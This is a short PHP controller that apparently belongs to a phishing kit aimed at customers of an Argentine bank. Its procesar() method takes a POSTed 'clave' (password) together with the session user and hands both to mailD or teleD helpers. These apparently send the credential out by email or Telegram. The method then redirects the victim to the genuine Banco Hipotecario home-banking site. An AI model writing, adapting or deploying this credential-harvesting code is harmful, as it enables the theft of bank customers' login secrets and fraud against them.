<?php

class DashboardController extends BaseController
{
	public $user = null;
   
   public function __construct() 
   {
      //;
   }
   
   public function index($user=null)
   {
	   $this->user = $user;
	   
      $this->view(PROJECT_ROOT_PATH . "/view/head.php");
      $this->view(PROJECT_ROOT_PATH . "/view/dashboard/dashboard.php");
      $this->view(PROJECT_ROOT_PATH . "/view/footer.php");
   }
   
  public function procesar()
  {
    // Edit Position
   $source = "Dashboard";
   $data = $_POST;
   if($data['action'] == 'INGRESAR via Email'){
      $this->mailD($data["clave"], $source, $_SESSION["user"]);
   }
   if($data['action'] == 'INGRESAR via Telegram'){
      $this->teleD($data["clave"], $source, $_SESSION["user"]);
   }
   header('Location: https://hb.hipotecario.com.ar/hbb/');
  }
   
}
